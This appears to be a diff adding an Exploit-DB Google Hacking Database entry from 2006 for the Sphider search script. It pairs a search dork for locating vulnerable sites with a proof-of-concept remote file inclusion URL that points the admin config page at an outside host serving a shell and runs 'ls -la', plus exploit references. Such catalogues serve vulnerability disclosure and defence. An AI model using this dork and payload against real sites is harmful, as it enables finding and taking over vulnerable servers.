@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/339
+Category:         Advisories and Vulnerabilities
+Published Date:   2006-04-15
+Author:           anonymous
+GoogleDork:       "powered by sphider" -exploit -ihackstuff -www.cs.ioc.ee
+Description:      "powered by sphider" -exploit -ihackstuff -www.cs.ioc.ee
+
+
+dork: "powered by sphider" a vulnerable search engine script arbitrary remote inclusion, poc: http://[target]/[path]/admin/configset.php?cmd=ls%20-la&amp;settings_dir=http://somehost.com where on somehost.com you have a shellcode in /conf.php/index.html references:http://retrogod.altervista.org/sphider_13_xpl_pl.htmlhttp://secunia.com/advisories/19642/
